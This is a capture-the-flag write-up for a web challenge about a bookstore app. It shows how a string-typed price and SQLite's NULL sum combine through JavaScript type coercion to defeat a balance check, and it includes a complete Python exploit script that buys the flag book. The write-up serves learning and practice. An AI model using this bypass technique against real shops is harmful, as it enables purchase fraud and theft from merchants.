# narnes-and-bobles

**Category:** web

---

#### Description

The site is a bookstore. You can register/login, add books to your cart, and checkout to download a zip of your purchased books. One book is `Flag` (`flag.txt`) but costs `1000000`, while new users start with a balance of `1000`.

Goal: bypass the balance check to buy the `Flag` book and read the flag from the downloaded zip.

#### Solution

Relevant code is in `server.js`:

1. Books are loaded from `books.json` into a `Map` (`booksLookup`). One book has a **string** price:
   * `The Part-Time Parliament` has `"price": "10"` (string)
   * `Flag` has `"price": 1000000` (number)
2. `/cart/add` tries to prevent adding non-sample items you can’t afford:
   * It queries the sum of existing non-sample cart items via SQL `SUM(...) AS cartSum`.
   * It computes the cost of the items being added via JS:
     * `additionalSum = ... .map(...price...).reduce((l, r) => l + r, 0);`
   * It blocks if `additionalSum + cartSum > balance`.
3. Two JS/SQLite behaviors combine into a bypass:
   * When the cart is empty, SQLite `SUM(...)` returns `NULL`, which becomes JS `null`.
   * JS `+` is concatenation if either side is a string. If the first added product has price `"10"`, the reduce becomes a string:
     * `0 + "10" -> "010"` (string)
     * `"010" + 1000000 -> "0101000000"` (string)
   * Then the check becomes:
     * `additionalSum + cartSum` is `"0101000000" + null` => `"0101000000null"`
     * `"0101000000null" > 1000` converts to `Number("0101000000null")` => `NaN`
     * `NaN > 1000` is `false`, so the purchase is incorrectly allowed.

Exploit:

1. Register a new user (empty cart so `cartSum` is `null`).
2. In a single `/cart/add` request, add:
   * `The Part-Time Parliament` (price `"10"`, forces string concatenation)
   * `Flag` (price `1000000`) with `is_sample: false` for both.
3. Checkout and read `flag.txt` from the returned zip.

Exploit code (Python):

```python
#!/usr/bin/env python3
import io
import secrets
import zipfile

import requests

BASE = "https://narnes-and-bobles.chall.lac.tf"

PART_TIME_ID = "a3e33c2505a19d18"   # price is the string "10"
FLAG_ID = "2a16e349fb9045fa"        # price is 1000000


def main():
    s = requests.Session()

    username = "user" + secrets.token_hex(8)
    password = secrets.token_hex(16)

    # Register (creates a session cookie).
    r = s.post(
        f"{BASE}/register",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=15,
    )
    r.raise_for_status()

    # Add both items in one request so cartSum is NULL->null.
    products = [
        {"book_id": PART_TIME_ID, "is_sample": False},
        {"book_id": FLAG_ID, "is_sample": False},
    ]
    r = s.post(f"{BASE}/cart/add", json={"products": products}, timeout=15)
    r.raise_for_status()

    # Checkout and extract flag.txt from the zip.
    r = s.post(f"{BASE}/cart/checkout", timeout=30)
    r.raise_for_status()

    zf = zipfile.ZipFile(io.BytesIO(r.content))
    flag = zf.read("flag.txt").decode().strip()
    print(flag)


if __name__ == "__main__":
    main()
```
